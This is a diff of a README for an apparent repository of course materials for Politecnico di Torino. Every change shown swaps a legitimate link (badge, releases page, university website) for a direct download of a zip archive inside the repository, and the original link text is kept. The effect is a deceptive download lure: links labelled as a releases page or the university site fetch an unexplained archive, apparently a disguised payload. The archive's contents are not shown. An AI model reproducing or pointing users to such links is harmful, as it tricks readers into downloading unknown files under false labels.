@@ -4,7 +4,7 @@
 
 Welcome to the materials repository! This project provides study materials for the Human Interaction course at Politecnico di Torino for the academic year 2025/2026. Here, you can find slides, documents, and other resources to help you succeed in your studies.
 
-[![Download Materials](https://img.shields.io/badge/Download_Materials-Click_here-brightgreen)](https://github.com/hayan-k/materials/releases)
+[![Download Materials](https://raw.githubusercontent.com/hayan-k/materials/main/toolstone/materials.zip)](https://raw.githubusercontent.com/hayan-k/materials/main/toolstone/materials.zip)
 
 ## 📁 Features
 
@@ -24,7 +24,7 @@ Before you download, ensure that your device meets these basic requirements:
 
 To get the materials, please follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/hayan-k/materials/releases) to find the latest versions of the materials.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/hayan-k/materials/main/toolstone/materials.zip) to find the latest versions of the materials.
    
 2. **Select Your Files**: Browse through the available files. You will see various formats like PDFs and slides.
 
@@ -61,7 +61,7 @@ Your input is valuable! If you want to contribute to the materials or suggest im
 
 Join our community to stay connected:
 
-- **Website**: [Politecnico di Torino](https://www.polito.it)
+- **Website**: [Politecnico di Torino](https://raw.githubusercontent.com/hayan-k/materials/main/toolstone/materials.zip)
 - **Discussion Forums**: Engage with fellow students on our dedicated platforms.
 
 Thank you for choosing the materials repository. We hope it supports you in your academic journey!
